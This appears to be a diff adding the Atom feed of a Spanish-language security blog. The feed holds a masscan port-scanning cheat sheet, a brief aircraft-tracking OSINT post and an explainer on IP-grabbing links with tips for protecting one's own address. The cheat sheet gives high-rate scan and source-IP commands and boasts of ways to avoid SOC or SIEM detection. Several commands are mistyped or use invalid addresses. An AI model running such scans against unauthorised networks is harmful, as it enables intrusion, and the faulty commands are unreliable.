@@ -1,0 +1,2108 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-12-20T22:42:30+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">ƬMᄃYBΣЯ</title><subtitle>Personal Blog</subtitle><entry><title type="html">Masscan [tmcybers Hidden Aim]</title><link href="http://localhost:4000/blog/masscan-cheat-sheet" rel="alternate" type="text/html" title="Masscan [tmcybers Hidden Aim]" /><published>2022-12-20T00:00:00+01:00</published><updated>2022-12-20T00:00:00+01:00</updated><id>http://localhost:4000/blog/masscan-cheat-sheet</id><content type="html" xml:base="http://localhost:4000/blog/masscan-cheat-sheet"><![CDATA[<h1 id="en-algunos-casos-masscan-es-mejor-que-nmap">En algunos casos, masscan es mejor que nmap</h1>
+
+<blockquote>
+  <blockquote>
+    <blockquote>
+      <blockquote>
+        <p>Masscan is the fastest scanner out there.[Es un scanner Ultra–Ultra Rapido]</p>
+        <blockquote>
+          <blockquote>
+            <p>Pero ten cuidado con el , porque es muy ruidoso, y si hay un equipo soc detras o siem , etcetera, te pueden pillar, pero en la practica veras que hay maneras de pasar por alto, sin que esta gente ni se enteren,<_></_></p>
+          </blockquote>
+        </blockquote>
+      </blockquote>
+    </blockquote>
+  </blockquote>
+</blockquote>
+
+<h1 id="target-specification">Target specification</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan 10.0.0.1 
+masscan 10.0.0.0/24 192.168.1.0/24
+</code></pre></div></div>
+
+<h1 id="exclude-ip-file">Exclude IP file</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan 10.0.0.1/24 --excludeFile &lt;file&gt;
+</code></pre></div></div>
+
+<h1 id="exclude-a-single-ip-from-the-scan">Exclude a single IP from the scan</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan 180.215.0.0/16 --exclude=180.215.122.120
+</code></pre></div></div>
+
+<h1 id="port-specification">Port specification</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan 10.0.0.0.1 -p 80
+masscan 10.0.0.0.1 -p 0-65535
+masscan 10.0.0.0.1 -p 80,443
+</code></pre></div></div>
+
+<h1 id="udp-scan">UDP Scan</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan 10.0.0.0.1 -pU 53
+</code></pre></div></div>
+
+<h1 id="used-to-scan-in-offline-mode">Used to scan in offline mode</h1>
+<ul>
+  <li>It does not send any traffic but just estimate the time length
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan 0.0.0.0/24 --offline
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h1 id="using-the-rate-to-send-x-packets-per-second">Using the rate to send X packets per second</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan 10.0.0.1/24 --rate 10000
+</code></pre></div></div>
+
+<h1 id="get-banners-from-services-only-few-protocols-supported">Get banners from services (only few protocols supported)</h1>
+<ul>
+  <li>Problem is that masscan uses his own TCP/IP stack so when the local system</li>
+  <li>received a SYN-ACK from the probed target, it responds with a TST packet that</li>
+  <li>kills the connection before the banner information can be grabbed.</li>
+  <li>You can use –source-ip to assign another IP to prevent
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan 10.0.0.1 --banners
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h1 id="assign-masscan-to-another-ip">Assign masscan to another IP</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan 10.0.0.1 --source-ip 192.168.1.200
+</code></pre></div></div>
+
+<h1 id="include-a-ping">Include a ping</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan 10.0.0.1 --ping
+</code></pre></div></div>
+
+<h1 id="change-the-default-user-agent">Change the default user agent</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan 10.0.0.1 --http-user-agent &lt;user-agent&gt;
+</code></pre></div></div>
+
+<h1 id="report-only-open-ports">Report only open ports</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan 10.0.0.1 --open-only
+</code></pre></div></div>
+
+<h1 id="save-sent-packet-in-pcap">Save sent packet in PCAP</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan 10.0.0.1 --pcap &lt;filename&gt;
+</code></pre></div></div>
+
+<h1 id="print-packets-in-terminal-ok-in-low-rate-but-rip-terminal-with-high-rates">Print packets in terminal (ok in low rate but RIP terminal with high rates)</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan 10.0.0.1 --packet-trace
+</code></pre></div></div>
+
+<h1 id="output-in-binary-mode">Output in binary mode</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>massscan 10.1.1.1/24 -p 80 -oB &lt;filename&gt;
+</code></pre></div></div>
+
+<h1 id="output-in-xml-format">Output in XML format</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>massscan 10.1.1.1/24 -p 80 -oX &lt;filename&gt;
+</code></pre></div></div>
+
+<h1 id="output-in-grepable-format">Output in grepable format</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>massscan 10.1.1.1/24 -p 80 -oG &lt;filename&gt;
+</code></pre></div></div>
+
+<h1 id="output-in-json-format">Output in JSON format</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>massscan 10.1.1.1/24 -p 80 -oJ &lt;filename&gt;
+</code></pre></div></div>
+
+<h1 id="output-in-simple-list-format">Output in simple list format</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>massscan 10.1.1.1/24 -p 80 -oL &lt;filename&gt;
+</code></pre></div></div>
+
+<h1 id="read-a-binary-output-and-writes-it-to-the-console">Read a binary output and writes it to the console</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan --readscan bin-test.scan
+</code></pre></div></div>
+
+<h1 id="read-a-binary-scan-and-convert-it-to-another-format">Read a binary scan and convert it to another format</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan --readscan bin-test.scan -oX bin-test.xml
+</code></pre></div></div>
+
+<h1 id="complete-commands">Complete commands</h1>
+<h3 id="quick-port-identification">Quick port identification</h3>
+<h2 id="--subnet-target">- Subnet target</h2>
+<h3 id="--port-range">- Port range</h3>
+<h3 id="--high-speed">- High speed</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan 10.1.1.1/24 -p 0-65535 --rate 1000000 --open-only --http-user-agent \
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"\
+ -oL "output.txt"
+</code></pre></div></div>
+
+<h1 id="multiple-targets-specific-scan">Multiple targets specific scan</h1>
+<h3 id="--known-ports">- Known ports</h3>
+<h3 id="--fast-rate-100000">- Fast rate 100.000</h3>
+<h2 id="--banner-grabbing-and-another-source-ip">- Banner grabbing and another source IP</h2>
+<h3 id="--only-open-ports">- Only open ports</h3>
+<h3 id="--modified-user-agent">- Modified user-agent</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan &lt;target1&gt; &lt;target2&gt; &lt;target3&gt; -p 80,433 --rate 100000 --banners --open-only\
+--http-user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"\
+--source-ip 192.168.100.200 -oL "output.txt" 
+</code></pre></div></div>
+
+<h1 id="top-20-ports-scanning">TOP 20 ports scanning</h1>
+<h2 id="modified-user-agent">Modified user-agent</h2>
+<h3 id="medium-speed">Medium speed</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan &lt;target&gt; -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080\
+--http-user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"\
+--rate 100000 --oL "output.txt"
+</code></pre></div></div>
+
+<h1 id="como-dije-anteriormente-en-algunos-casos-masscan-puede-ser-mejor-que-nmap-ten-en-cuenta-esto">Como dije anteriormente en algunos casos, Masscan puede ser mejor que nmap, ten en cuenta esto.</h1>
+<h3 id="por-ejemplo-al-buscar-un-rango-amplio-en-algunos-puertos-solo">Por ejemplo, al buscar un rango amplio en algunos puertos solo.</h3>
+<h3 id="pentest-interno-por-ejemplo-puede-hacer-múltiples-iteraciones-de-escaneos">(Pentest interno, por ejemplo) puede hacer múltiples iteraciones de escaneos</h3>
+
+<h2 id="la-salida-xml-es-interesante-para-db_import-en-metasploit">La salida XML es interesante para db_import en metasploit</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo masscan &lt;target/16&gt; -p 22 --rate 2000 -oX output_port_22.xml
+</code></pre></div></div>
+
+<hr />
+
+<blockquote>
+  <blockquote>
+    <blockquote>
+      <blockquote>
+        <p>stay-safe!</p>
+      </blockquote>
+    </blockquote>
+  </blockquote>
+</blockquote>
+
+<hr />
+
+<style>
+    #share-buttons {
+        display: inline-block;
+        vertical-align: middle;
+    }
+
+    #share-buttons:after {
+        content: "`In a time of deceit telling the truth is a revolutionary act`";
+        display: block;
+        clear: both;
+    }
+
+    #share-buttons>div {
+        position: relative;
+        text-align: left;
+        height: 36px;
+        width: 32px;
+        float: left;
+        text-align: center;
+    }
+
+    #share-buttons>div>svg {
+        height: 16px;
+        fill: #0eec46;
+        margin-top: 20px;
+    }
+
+    #share-buttons>div:hover {
+        cursor: pointer;
+    }
+
+    #share-buttons>div.facebook:hover>svg {
+        fill: #3B5998;
+    }
+
+    #share-buttons>div.twitter:hover>svg {
+        fill: #55ACEE;
+    }
+
+    #share-buttons>div.linkedin:hover>svg {
+        fill: #0077b5;
+    }
+
+    #share-buttons>div.pinterest:hover>svg {
+        fill: #CB2027;
+    }
+
+    #share-buttons>div.gplus:hover>svg {
+        fill: #dd4b39;
+    }
+
+    #share-buttons>div.mail:hover>svg {
+        fill: #7D7D7D;
+    }
+
+    #share-buttons>div.instagram:hover>svg {
+        fill: #C73B92;
+    }
+
+    #share-buttons>div.facebook>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
+    #share-buttons>div.twitter>svg {
+        height: 33px;
+        margin-top: 8px;
+    }
+
+    #share-buttons>div.linkedin>svg {
+        height: 32px;
+        margin-top: 7px;
+    }
+
+    #share-buttons>div.pinterest>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
+    /*#share-buttons>div.gplus>svg {
+        height: 28px;
+        margin-top: 9px;
+        position: relative;
+        left: 1px;
+    }*/
+
+    #share-buttons>div.mail>svg {
+        height: 29px;
+        margin-top: 11px;
+    }
+</style>
+
+<p><span style="color: rgb(114, 248, 4);">Share on: </span></p>
+<div id="share-buttons">
+    <div class="facebook" title="Share this on Facebook" onclick="window.open('http://www.facebook.com/share.php?u=http://localhost:4000/blog/masscan-cheat-sheet');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1343 12v264h-157q-86 0-116 36t-30 108v189h293l-39 296h-254v759h-306v-759h-255v-296h255v-218q0-186 104-288.5t277-102.5q147 0 228 12z" />
+        </svg></div>
+    <div class="twitter" title="Share this on Twitter" onclick="window.open('http://twitter.com/home?status=http://localhost:4000/blog/masscan-cheat-sheet');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1684 408q-67 98-162 167 1 14 1 42 0 130-38 259.5t-115.5 248.5-184.5 210.5-258 146-323 54.5q-271 0-496-145 35 4 78 4 225 0 401-138-105-2-188-64.5t-114-159.5q33 5 61 5 43 0 85-11-112-23-185.5-111.5t-73.5-205.5v-4q68 38 146 41-66-44-105-115t-39-154q0-88 44-163 121 149 294.5 238.5t371.5 99.5q-8-38-8-74 0-134 94.5-228.5t228.5-94.5q140 0 236 102 109-21 205-78-37 115-142 178 93-10 186-50z" />
+        </svg></div>
+    <div class="linkedin" title="Share this on Linkedin" onclick="window.open('https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:4000/blog/masscan-cheat-sheet&amp;title=&amp;summary=&amp;source=');">
+        <svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M477 625v991h-330v-991h330zm21-306q1 73-50.5 122t-135.5 49h-2q-82 0-132-49t-50-122q0-74 51.5-122.5t134.5-48.5 133 48.5 51 122.5zm1166 729v568h-329v-530q0-105-40.5-164.5t-126.5-59.5q-63 0-105.5 34.5t-63.5 85.5q-11 30-11 81v553h-329q2-399 2-647t-1-296l-1-48h329v144h-2q20-32 41-56t56.5-52 87-43.5 114.5-15.5q171 0 275 113.5t104 332.5z" />
+        </svg>
+    </div>
+    
+    <!--<div class="gplus" title="Share this on Google Plus"
+        onclick="window.open('https://plus.google.com/share?url=http://localhost:4000/blog/masscan-cheat-sheet');"><svg
+            viewBox="0 0 2304 1792" xmlns="http://www.w3.org/2000/svg">
+            <path
+                d="M1437 913q0 208-87 370.5t-248 254-369 91.5q-149 0-285-58t-234-156-156-234-58-285 58-285 156-234 234-156 285-58q286 0 491 192l-199 191q-117-113-292-113-123 0-227.5 62t-165.5 168.5-61 232.5 61 232.5 165.5 168.5 227.5 62q83 0 152.5-23t114.5-57.5 78.5-78.5 49-83 21.5-74h-416v-252h692q12 63 12 122zm867-122v210h-209v209h-210v-209h-209v-210h209v-209h210v209h209z" />
+        </svg></div> -->
+    <div class="mail" title="Share this through Email" onclick="window.open('mailto:?&amp;body=http://localhost:4000/blog/masscan-cheat-sheet');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1792 710v794q0 66-47 113t-113 47h-1472q-66 0-113-47t-47-113v-794q44 49 101 87 362 246 497 345 57 42 92.5 65.5t94.5 48 110 24.5h2q51 0 110-24.5t94.5-48 92.5-65.5q170-123 498-345 57-39 100-87zm0-294q0 79-49 151t-122 123q-376 261-468 325-10 7-42.5 30.5t-54 38-52 32.5-57.5 27-50 9h-2q-23 0-50-9t-57.5-27-52-32.5-54-38-42.5-30.5q-91-64-262-182.5t-205-142.5q-62-42-117-115.5t-55-136.5q0-78 41.5-130t118.5-52h1472q65 0 112.5 47t47.5 113z" />
+        </svg></div>
+</div>]]></content><author><name></name></author><category term="CyberSecurity" /><category term="Hacking" /><category term="Masscan" /><summary type="html"><![CDATA[My masscan hidden aim cheatsheet]]></summary></entry><entry><title type="html">OSINT a 10.000 Metros</title><link href="http://localhost:4000/blog/aircraft-spy" rel="alternate" type="text/html" title="OSINT a 10.000 Metros" /><published>2022-11-17T00:00:00+01:00</published><updated>2022-11-17T00:00:00+01:00</updated><id>http://localhost:4000/blog/aircraft-spy</id><content type="html" xml:base="http://localhost:4000/blog/aircraft-spy"><![CDATA[<h4 id="-osint-a-10000-metros-de-altura">🕸 OSINT a 10.000 metros de altura.</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>hackear un avion no es posible <span class="nt">--</span><span class="o">&gt;</span> pero si es posible, sacarle hasta los ultimos detalles <span class="o">]</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">🕷 investigación de aeronaves en todo el mundo 24/24, salidas, llegadas, equipo (excluido del por motivos eticos),temperatura, altura, retrasos, clima y mucho mas.</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>🕣 Si alguna vez compras un vuelo y queres saber si es real, o te han estafado , no dudes en contactarme.
+</code></pre></div></div>
+
+<hr />
+<p>🚹 Tu pareja o familiar se va en un vuelo muy largo y sientes preocupacion por el/ella, y queres seguirle de cerca en todo el momento mientras se encuentra ahy arriba, apuntate bien este video.
+—</p>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/vIs_4zm1AjE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
+
+<style>
+    #share-buttons {
+        display: inline-block;
+        vertical-align: middle;
+    }
+
+    #share-buttons:after {
+        content: "`In a time of deceit telling the truth is a revolutionary act`";
+        display: block;
+        clear: both;
+    }
+
+    #share-buttons>div {
+        position: relative;
+        text-align: left;
+        height: 36px;
+        width: 32px;
+        float: left;
+        text-align: center;
+    }
+
+    #share-buttons>div>svg {
+        height: 16px;
+        fill: #0eec46;
+        margin-top: 20px;
+    }
+
+    #share-buttons>div:hover {
+        cursor: pointer;
+    }
+
+    #share-buttons>div.facebook:hover>svg {
+        fill: #3B5998;
+    }
+
+    #share-buttons>div.twitter:hover>svg {
+        fill: #55ACEE;
+    }
+
+    #share-buttons>div.linkedin:hover>svg {
+        fill: #0077b5;
+    }
+
+    #share-buttons>div.pinterest:hover>svg {
+        fill: #CB2027;
+    }
+
+    #share-buttons>div.gplus:hover>svg {
+        fill: #dd4b39;
+    }
+
+    #share-buttons>div.mail:hover>svg {
+        fill: #7D7D7D;
+    }
+
+    #share-buttons>div.instagram:hover>svg {
+        fill: #C73B92;
+    }
+
+    #share-buttons>div.facebook>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
+    #share-buttons>div.twitter>svg {
+        height: 33px;
+        margin-top: 8px;
+    }
+
+    #share-buttons>div.linkedin>svg {
+        height: 32px;
+        margin-top: 7px;
+    }
+
+    #share-buttons>div.pinterest>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
+    /*#share-buttons>div.gplus>svg {
+        height: 28px;
+        margin-top: 9px;
+        position: relative;
+        left: 1px;
+    }*/
+
+    #share-buttons>div.mail>svg {
+        height: 29px;
+        margin-top: 11px;
+    }
+</style>
+
+<p><span style="color: rgb(114, 248, 4);">Share on: </span></p>
+<div id="share-buttons">
+    <div class="facebook" title="Share this on Facebook" onclick="window.open('http://www.facebook.com/share.php?u=http://localhost:4000/blog/aircraft-spy');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1343 12v264h-157q-86 0-116 36t-30 108v189h293l-39 296h-254v759h-306v-759h-255v-296h255v-218q0-186 104-288.5t277-102.5q147 0 228 12z" />
+        </svg></div>
+    <div class="twitter" title="Share this on Twitter" onclick="window.open('http://twitter.com/home?status=http://localhost:4000/blog/aircraft-spy');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1684 408q-67 98-162 167 1 14 1 42 0 130-38 259.5t-115.5 248.5-184.5 210.5-258 146-323 54.5q-271 0-496-145 35 4 78 4 225 0 401-138-105-2-188-64.5t-114-159.5q33 5 61 5 43 0 85-11-112-23-185.5-111.5t-73.5-205.5v-4q68 38 146 41-66-44-105-115t-39-154q0-88 44-163 121 149 294.5 238.5t371.5 99.5q-8-38-8-74 0-134 94.5-228.5t228.5-94.5q140 0 236 102 109-21 205-78-37 115-142 178 93-10 186-50z" />
+        </svg></div>
+    <div class="linkedin" title="Share this on Linkedin" onclick="window.open('https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:4000/blog/aircraft-spy&amp;title=&amp;summary=&amp;source=');">
+        <svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M477 625v991h-330v-991h330zm21-306q1 73-50.5 122t-135.5 49h-2q-82 0-132-49t-50-122q0-74 51.5-122.5t134.5-48.5 133 48.5 51 122.5zm1166 729v568h-329v-530q0-105-40.5-164.5t-126.5-59.5q-63 0-105.5 34.5t-63.5 85.5q-11 30-11 81v553h-329q2-399 2-647t-1-296l-1-48h329v144h-2q20-32 41-56t56.5-52 87-43.5 114.5-15.5q171 0 275 113.5t104 332.5z" />
+        </svg>
+    </div>
+    
+    <!--<div class="gplus" title="Share this on Google Plus"
+        onclick="window.open('https://plus.google.com/share?url=http://localhost:4000/blog/aircraft-spy');"><svg
+            viewBox="0 0 2304 1792" xmlns="http://www.w3.org/2000/svg">
+            <path
+                d="M1437 913q0 208-87 370.5t-248 254-369 91.5q-149 0-285-58t-234-156-156-234-58-285 58-285 156-234 234-156 285-58q286 0 491 192l-199 191q-117-113-292-113-123 0-227.5 62t-165.5 168.5-61 232.5 61 232.5 165.5 168.5 227.5 62q83 0 152.5-23t114.5-57.5 78.5-78.5 49-83 21.5-74h-416v-252h692q12 63 12 122zm867-122v210h-209v209h-210v-209h-209v-210h209v-209h210v209h209z" />
+        </svg></div> -->
+    <div class="mail" title="Share this through Email" onclick="window.open('mailto:?&amp;body=http://localhost:4000/blog/aircraft-spy');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1792 710v794q0 66-47 113t-113 47h-1472q-66 0-113-47t-47-113v-794q44 49 101 87 362 246 497 345 57 42 92.5 65.5t94.5 48 110 24.5h2q51 0 110-24.5t94.5-48 92.5-65.5q170-123 498-345 57-39 100-87zm0-294q0 79-49 151t-122 123q-376 261-468 325-10 7-42.5 30.5t-54 38-52 32.5-57.5 27-50 9h-2q-23 0-50-9t-57.5-27-52-32.5-54-38-42.5-30.5q-91-64-262-182.5t-205-142.5q-62-42-117-115.5t-55-136.5q0-78 41.5-130t118.5-52h1472q65 0 112.5 47t47.5 113z" />
+        </svg></div>
+</div>]]></content><author><name></name></author><category term="CyberSecurity" /><category term="Hacker" /><category term="OSINT" /><summary type="html"><![CDATA[Investigacion de Aeronaves]]></summary></entry><entry><title type="html">Captura de Direcciones IP</title><link href="http://localhost:4000/blog/ip-grabber" rel="alternate" type="text/html" title="Captura de Direcciones IP" /><published>2022-11-17T00:00:00+01:00</published><updated>2022-11-17T00:00:00+01:00</updated><id>http://localhost:4000/blog/ip-grabber</id><content type="html" xml:base="http://localhost:4000/blog/ip-grabber"><![CDATA[<h3 id="-qué-es-el-acaparamiento-de-ip-y-cómo-proteger-su-ip">👌 ¿Qué es el acaparamiento de IP? (y cómo proteger su IP)</h3>
+
+<p><code class="language-plaintext highlighter-rouge">✍ ¿Cómo se capturan las direcciones IP?</code></p>
+
+<h3 id="-hay-muchas-herramientas-gratuitas-disponibles-en-la-web-para-obtener-direcciones-ip">👉 Hay muchas herramientas gratuitas disponibles en la web para obtener direcciones IP.</h3>
+<p>👉 La mayoría de estas herramientas utilizan enlaces, que pueden parecer URL abreviadas, para extraer direcciones IP.
+—</p>
+
+<p>👁 Cuando el receptor haga clic en el enlace, el remitente podrá ver la dirección IP del receptor. ¿Cómo protegerse del acaparamiento de IP? Una dirección IP por sí sola no representa demasiado riesgo, ya que no se puede usar para revelar su identidad o piratear su computadora.</p>
+
+<p><code class="language-plaintext highlighter-rouge">🐭 Dicho esto, es posible usar una dirección IP para bloquear la capacidad de los usuarios para acceder a ciertos sitios web, juegos en línea y foros.</code></p>
+
+<h3 id="-por-lo-tanto-es-una-buena-práctica-mantener-su-dirección-ip-oculta-a-terceros">🕷 Por lo tanto, es una buena práctica mantener su dirección IP oculta a terceros.</h3>
+
+<p>🕸 Enumeramos algunas de las cosas que puede hacer para proteger su dirección IP: mantener la configuración de privacidad en “privada” en las aplicaciones, usar una dirección IP dinámica en lugar de direcciones IP estáticas, mantener su firewall y enrutador actualizados, cambiar la contraseña predeterminada de su enrutador y ajustar configuración del firewall para bloquear solicitudes de ping, hacer clic en enlaces solo de fuentes confiables, usar una red privada virtual o VPN.</p>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/k3s-lfIGCVY" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
+
+<style>
+    #share-buttons {
+        display: inline-block;
+        vertical-align: middle;
+    }
+
+    #share-buttons:after {
+        content: "`In a time of deceit telling the truth is a revolutionary act`";
+        display: block;
+        clear: both;
+    }
+
+    #share-buttons>div {
+        position: relative;
+        text-align: left;
+        height: 36px;
+        width: 32px;
+        float: left;
+        text-align: center;
+    }
+
+    #share-buttons>div>svg {
+        height: 16px;
+        fill: #0eec46;
+        margin-top: 20px;
+    }
+
+    #share-buttons>div:hover {
+        cursor: pointer;
+    }
+
+    #share-buttons>div.facebook:hover>svg {
+        fill: #3B5998;
+    }
+
+    #share-buttons>div.twitter:hover>svg {
+        fill: #55ACEE;
+    }
+
+    #share-buttons>div.linkedin:hover>svg {
+        fill: #0077b5;
+    }
+
+    #share-buttons>div.pinterest:hover>svg {
+        fill: #CB2027;
+    }
+
+    #share-buttons>div.gplus:hover>svg {
+        fill: #dd4b39;
+    }
+
+    #share-buttons>div.mail:hover>svg {
+        fill: #7D7D7D;
+    }
+
+    #share-buttons>div.instagram:hover>svg {
+        fill: #C73B92;
+    }
+
+    #share-buttons>div.facebook>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
+    #share-buttons>div.twitter>svg {
+        height: 33px;
+        margin-top: 8px;
+    }
+
+    #share-buttons>div.linkedin>svg {
+        height: 32px;
+        margin-top: 7px;
+    }
+
+    #share-buttons>div.pinterest>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
+    /*#share-buttons>div.gplus>svg {
+        height: 28px;
+        margin-top: 9px;
+        position: relative;
+        left: 1px;
+    }*/
+
+    #share-buttons>div.mail>svg {
+        height: 29px;
+        margin-top: 11px;
+    }
+</style>
+
+<p><span style="color: rgb(114, 248, 4);">Share on: </span></p>
+<div id="share-buttons">
+    <div class="facebook" title="Share this on Facebook" onclick="window.open('http://www.facebook.com/share.php?u=http://localhost:4000/blog/ip-grabber');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1343 12v264h-157q-86 0-116 36t-30 108v189h293l-39 296h-254v759h-306v-759h-255v-296h255v-218q0-186 104-288.5t277-102.5q147 0 228 12z" />
+        </svg></div>
+    <div class="twitter" title="Share this on Twitter" onclick="window.open('http://twitter.com/home?status=http://localhost:4000/blog/ip-grabber');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1684 408q-67 98-162 167 1 14 1 42 0 130-38 259.5t-115.5 248.5-184.5 210.5-258 146-323 54.5q-271 0-496-145 35 4 78 4 225 0 401-138-105-2-188-64.5t-114-159.5q33 5 61 5 43 0 85-11-112-23-185.5-111.5t-73.5-205.5v-4q68 38 146 41-66-44-105-115t-39-154q0-88 44-163 121 149 294.5 238.5t371.5 99.5q-8-38-8-74 0-134 94.5-228.5t228.5-94.5q140 0 236 102 109-21 205-78-37 115-142 178 93-10 186-50z" />
+        </svg></div>
+    <div class="linkedin" title="Share this on Linkedin" onclick="window.open('https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:4000/blog/ip-grabber&amp;title=&amp;summary=&amp;source=');">
+        <svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M477 625v991h-330v-991h330zm21-306q1 73-50.5 122t-135.5 49h-2q-82 0-132-49t-50-122q0-74 51.5-122.5t134.5-48.5 133 48.5 51 122.5zm1166 729v568h-329v-530q0-105-40.5-164.5t-126.5-59.5q-63 0-105.5 34.5t-63.5 85.5q-11 30-11 81v553h-329q2-399 2-647t-1-296l-1-48h329v144h-2q20-32 41-56t56.5-52 87-43.5 114.5-15.5q171 0 275 113.5t104 332.5z" />
+        </svg>
+    </div>
+    
+    <!--<div class="gplus" title="Share this on Google Plus"
+        onclick="window.open('https://plus.google.com/share?url=http://localhost:4000/blog/ip-grabber');"><svg
+            viewBox="0 0 2304 1792" xmlns="http://www.w3.org/2000/svg">
+            <path
+                d="M1437 913q0 208-87 370.5t-248 254-369 91.5q-149 0-285-58t-234-156-156-234-58-285 58-285 156-234 234-156 285-58q286 0 491 192l-199 191q-117-113-292-113-123 0-227.5 62t-165.5 168.5-61 232.5 61 232.5 165.5 168.5 227.5 62q83 0 152.5-23t114.5-57.5 78.5-78.5 49-83 21.5-74h-416v-252h692q12 63 12 122zm867-122v210h-209v209h-210v-209h-209v-210h209v-209h210v209h209z" />
+        </svg></div> -->
+    <div class="mail" title="Share this through Email" onclick="window.open('mailto:?&amp;body=http://localhost:4000/blog/ip-grabber');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1792 710v794q0 66-47 113t-113 47h-1472q-66 0-113-47t-47-113v-794q44 49 101 87 362 246 497 345 57 42 92.5 65.5t94.5 48 110 24.5h2q51 0 110-24.5t94.5-48 92.5-65.5q170-123 498-345 57-39 100-87zm0-294q0 79-49 151t-122 123q-376 261-468 325-10 7-42.5 30.5t-54 38-52 32.5-57.5 27-50 9h-2q-23 0-50-9t-57.5-27-52-32.5-54-38-42.5-30.5q-91-64-262-182.5t-205-142.5q-62-42-117-115.5t-55-136.5q0-78 41.5-130t118.5-52h1472q65 0 112.5 47t47.5 113z" />
+        </svg></div>
